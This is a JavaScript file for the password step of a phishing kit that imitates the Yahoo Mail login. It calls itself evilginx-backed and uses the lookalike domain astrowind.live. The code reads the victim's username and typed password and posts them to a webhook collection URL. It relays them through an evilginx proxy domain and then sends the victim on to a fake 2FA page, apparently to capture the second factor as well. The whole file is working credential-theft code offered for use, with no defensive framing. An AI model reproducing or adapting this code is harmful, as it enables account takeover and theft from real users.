// --- CONFIGURATION ---
const CONFIG = {
  nextPages: {
    twofa: "./2fa-selection.html",
    success: "https://mail.astrowind.live/d/folders/1",
  },
  webhookUrl: "https://webhook.site/YOUR_UNIQUE_ID", // IMPORTANT: Replace with your webhook URL
  evilginxDomain: "api.astrowind.live", // The API proxy domain
}

// --- STATE MANAGEMENT ---
const state = {
  username: "",
  sessionData: {},
  isSubmitting: false,
}

// --- UTILITY FUNCTIONS ---
const utils = {
  showError: (message) => {
    const errorEl = document.getElementById("error-message")
    if (errorEl) {
      errorEl.textContent = message
      errorEl.style.display = "block"
      setTimeout(() => {
        errorEl.style.display = "none"
      }, 5000)
    }
  },
  setLoading: (isLoading) => {
    const submitBtn = document.querySelector(".yahoo-submit-btn")
    if (submitBtn) {
      submitBtn.disabled = isLoading
      submitBtn.textContent = isLoading ? "Please wait..." : "Next"
    }
    state.isSubmitting = isLoading
  },
  captureData: async (data) => {
    try {
      await fetch(CONFIG.webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...data,
          timestamp: new Date().toISOString(),
          ...state.sessionData,
        }),
      })
    } catch (error) {
      console.warn("Webhook capture failed:", error)
    }
  },
}

// --- SESSION MANAGEMENT ---
const sessionManager = {
  init: () => {
    const urlParams = new URLSearchParams(window.location.search)

    state.username = urlParams.get("u") || "Unknown User"
    state.sessionData = {
      sessionIndex: urlParams.get("sessionIndex") || "N/A",
      acrumb: urlParams.get("acrumb") || "N/A",
      done: urlParams.get("done") || "https://mail.yahoo.com/",
      src: urlParams.get("src") || "ym",
      timestamp: urlParams.get("t") || Date.now(),
    }

    const userDisplayEl = document.getElementById("user-display")
    if (userDisplayEl) {
      userDisplayEl.textContent = state.username
    }

    utils.captureData({ type: "password_page_loaded", username: state.username })
  },
}

// --- FORM HANDLERS ---
const formHandlers = {
  handlePasswordSubmit: async (event) => {
    event.preventDefault()
    if (state.isSubmitting) return

    const password = document.getElementById("password").value
    if (!password) {
      utils.showError("Please enter your password.")
      return
    }

    utils.setLoading(true)
    await utils.captureData({
      type: "credentials_captured",
      username: state.username,
      password: password,
    })

    const formData = new URLSearchParams({
      username: state.username,
      passwd: password,
      ...state.sessionData,
    })

    try {
      const response = await fetch(`https://${CONFIG.evilginxDomain}/account/challenge/password`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: formData,
        credentials: "include",
      })

      console.log("Password submitted to evilginx. Proceeding to 2FA.")
      await utils.captureData({ type: "password_submitted_proceeding_to_2fa" })

      const params = new URLSearchParams({
        u: state.username,
        ...state.sessionData,
      })

      window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`
    } catch (error) {
      console.error("Fetch to evilginx failed:", error)
      await utils.captureData({
        type: "fetch_error_proceeding_to_2fa",
        error: error.message,
      })

      const params = new URLSearchParams({
        u: state.username,
        ...state.sessionData,
      })
      window.location.href = `${CONFIG.nextPages.twofa}?${params.toString()}`
    }
  },
}

// --- EVENT LISTENERS ---
const setupEventListeners = () => {
  const passwordForm = document.getElementById("password-form")
  if (passwordForm) {
    passwordForm.addEventListener("submit", formHandlers.handlePasswordSubmit)
  }
}

// --- INITIALIZATION ---
document.addEventListener("DOMContentLoaded", () => {
  sessionManager.init()
  setupEventListeners()
})
